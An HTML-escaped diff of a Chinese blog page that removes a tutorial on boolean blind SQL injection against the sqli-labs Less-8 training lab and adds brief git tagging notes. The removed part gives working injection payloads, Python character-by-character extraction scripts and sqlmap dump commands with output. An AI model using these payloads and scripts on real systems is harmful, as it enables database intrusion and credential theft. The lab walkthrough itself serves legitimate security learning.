+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/Catcheryp/Catcheryp.github.io.git
+git add .
+git commit -m &quot;XXX&quot;
+git push
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;h3 id=&quot;2-盲注中常用-mysql-相关函数&quot;&gt;2. 盲注中常用 MySQL 相关函数&lt;/h3&gt;
+&lt;h3 id=&quot;2打标签发布&quot;&gt;2.打标签发布&lt;/h3&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;length(str)：返回str字符串的长度。
-substr(str, pos, len)：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始
-mid(str,pos,len):跟上面的一样，截取字符串
-ascii(str)：返回字符串str的最左面字符的ASCII代码值。
-ord(str):同上，返回ascii码
-if(a,b,c) :a为条件，a为true，返回b，否则返回c，如if(1&amp;gt;2,1,0),返回0
-select database()查询数据库
-ascii(substr((select database()),1,1))：返回数据库名称的第一个字母,转化为ascii码
-ascii(substr((select database()),1,1))&amp;gt;64：ascii大于64就返回true，if就返回1，否则返回0
-常见的ASCII，A:65,Z:90 a:97,z:122,  0:48, 9:57
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git tag v0.1-alpha   #创建轻量标签
+git push origin --tags   #把所有不在远程仓库服务器上的标签全部传送到那里
+git tag   #在 Git 中列出已有的标签
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;h2 id=&quot;0x02--构造-payload&quot;&gt;0x02  构造 Payload&lt;/h2&gt;
+&lt;h3 id=&quot;参考&quot;&gt;参考：&lt;/h3&gt;
 
-&lt;h3 id=&quot;1-猜数据库长度&quot;&gt;1. 猜数据库长度&lt;/h3&gt;
-
-&lt;p&gt;&lt;strong&gt;payload：&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1' and length(database())=X --+
-或
-id=1' and length(database())&amp;gt;=X --+  (主要方便使用二分法，提升一下效率)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#encoding: utf-8&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;string&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;rq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://192.168.1.102/sqli/Less-8/?id=1' and length(database())={} --+&quot;&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;You are in&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; 
-		&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;2-猜数据库名&quot;&gt;2. 猜数据库名&lt;/h3&gt;
-
-&lt;p&gt;&lt;strong&gt;payload：&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1' and (ascii(substr((select database()),XX1,XX2)))=XX3 --+
-或
-id=1' and (ascii(substr((select database()),XX1,XX2)))&amp;gt;=XX3 --+  (主要方便使用二分法，提升一下效率)
-
-XX1: 是数据库名称(字符串)不同的位置 1-8
-XX2: 截取的字符长度 1
-XX3: 截取的字符 ascii 码值
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#encoding: utf-8&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;string&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;rq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://192.168.1.102/sqli/Less-8/?id=1' and (ascii(substr((select database()),{},1)))={} --+&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;digits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uppercase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lowercase&lt;/span&gt;
-
-
-&lt;span class=&quot;n&quot;&gt;database&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;database_len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;database_len&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;123&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;You are in&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-			&lt;span class=&quot;n&quot;&gt;database&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-			&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;database&lt;/span&gt;
-			&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;database&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;采用二分法提高下效率：&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#encoding: utf-8&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;string&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;rq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://192.168.1.102/sqli/Less-8/?id=1' and (ascii(substr((select database()),{},1)))&amp;gt;={} --+&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;digits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uppercase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lowercase&lt;/span&gt;
-
-
-&lt;span class=&quot;n&quot;&gt;database&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;database_len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;database_len&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;left&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;right&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;122&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;mid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;left&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;left&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;You are in&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-			&lt;span class=&quot;n&quot;&gt;left&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mid&lt;/span&gt;
-		&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-			&lt;span class=&quot;n&quot;&gt;right&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mid&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;mid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;left&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;right&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;database&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;left&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;database&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;database&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;3猜表的长度&quot;&gt;3.猜表的长度&lt;/h3&gt;
-
-&lt;p&gt;&lt;strong&gt;payload:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1' and (select length(table_name) from information_schema.tables where table_schema=database() limit XX1,XX2)=XX3 --+
-
-XX1: limit 第一个参数，指定第一个返回记录行的偏移量，从 0 开始，改变这里来求出所有表的长度
-XX2: limit 第二个参数，指定返回记录行的最大数目
-XX3: 猜测的表的长度
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;脚本基本一样就不放了。&lt;/p&gt;
-
-&lt;h3 id=&quot;4-猜表名&quot;&gt;4. 猜表名&lt;/h3&gt;
-
-&lt;p&gt;&lt;strong&gt;payload：&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit XX1,XX2),XX3,XX4)))=XX5 --+
-
-XX1: limit 第一个参数，指定第一个返回记录行的偏移量
-XX2: limit 第二个参数，指定返回记录行的最大数目
-XX3: 是表名称(字符串)不同的位置 
-XX4: 截取的字符长度 1
-XX5: 截取的字符 ascii 码值
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;脚本基本一样就不放了。&lt;/p&gt;
-
-&lt;h3 id=&quot;5猜字段的长度&quot;&gt;5.猜字段的长度&lt;/h3&gt;
-
-&lt;p&gt;这跟前面猜表长度那里基本一样了&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;payload:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1' and (select length(column_name) from information_schema.columns where table_schema=database() and table_name='users' limit XX1,XX2)=XX3 --+
-
-XX1: limit 第一个参数，指定第一个返回记录行的偏移量，从 0 开始，改变这里来求出所有字段的长度
-XX2: limit 第二个参数，指定返回记录行的最大数目
-XX3: 猜测的字段的长度
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;脚本基本一样就不放了。&lt;/p&gt;
-
-&lt;h3 id=&quot;6猜字段名&quot;&gt;6.猜字段名&lt;/h3&gt;
-
-&lt;p&gt;这里跟前面猜表名那里基本一样&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;payload:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1' and (ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit XX1,XX2),XX3,XX4)))=XX5 --+
-
-XX1: limit 第一个参数，指定第一个返回记录行的偏移量  2
-XX2: limit 第二个参数，指定返回记录行的最大数目
-XX3: 是字段名(字符串)不同的位置 
-XX4: 截取的字符长度 1
-XX5: 截取的字符 ascii 码值
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;脚本基本一样就不放了。&lt;/p&gt;
-
-&lt;h3 id=&quot;7-猜目标数据的长度&quot;&gt;7. 猜目标数据的长度&lt;/h3&gt;
-
-&lt;p&gt;通过之前我们知道了：&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;数据库 : security
-表：users
-目标字段: password (这里就暂且取一个目标字段作为例子)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;还是跟之前的一样&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;payload:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1' and (select length(password) from users limit 0,1)=X --+
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;8-猜目标数据&quot;&gt;8. 猜目标数据&lt;/h3&gt;
-
-&lt;p&gt;&lt;strong&gt;payload:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=1' and (ascii(substr((select password from users limit 0,1),XX1,1)))=XX2 --+
-
-XX1: 目标数据(字符串)每个字符的位置
-XX2: 目标数据字符串中字符的 ascii 码值
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;至此一次布尔盲注就完成了。&lt;/p&gt;
-
-&lt;h2 id=&quot;0x03-使用工具&quot;&gt;0x03 使用工具&lt;/h2&gt;
-
-&lt;h3 id=&quot;1-burpsuite&quot;&gt;1. burpsuite&lt;/h3&gt;
-
-&lt;p&gt;使用 burpsuite 来玩的话，跟暴破密码的路数基本一样，就不多说了。&lt;/p&gt;
-
-&lt;h3 id=&quot;2-sqlmap&quot;&gt;2. sqlmap&lt;/h3&gt;
-
-&lt;p&gt;&lt;strong&gt;step1: 暴出数据库名&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python sqlmap.py -u http://192.168.1.102/sqli/Less-8/?id=1 --dbs
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;回显&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;available databases [6]:
-[*] challenges
-[*] information_schema
-[*] mysql
-[*] performance_schema
-[*] security
-[*] test
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;step2:暴出security数据库中的表名&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python sqlmap.py -u http://192.168.1.102/sqli/Less-8/?id=1 --tables -D security
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;回显&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Database: security
-[4 tables]
-+----------+
-| emails   |
-| referers |
-| uagents  |
-| users    |
-+----------+
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;step3:暴出users表内容&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python sqlmap.py -u http://192.168.1.102/sqli/Less-8/?id=1 --dump -D security -T users
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;回显&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Database: security
-Table: users
-[13 entries]
-+----+----------+------------+
-| id | username | password   |
-+----+----------+------------+
-| 1  | Dumb     | Dumb       |
-| 2  | Angelina | I-kill-you |
-| 3  | Dummy    | p@ssword   |
-| 4  | secure   | crappy     |
-| 5  | stupid   | stupidity  |
-| 6  | superman | genious    |
-| 7  | batman   | mob!le     |
-| 8  | admin    | admin      |
-| 9  | admin1   | admin1     |
-| 10 | admin2   | admin2     |
-| 11 | admin3   | admin3     |
-| 12 | dhakkan  | dumbo      |
-| 14 | admin4   | admin4     |
-+----+----------+------------+
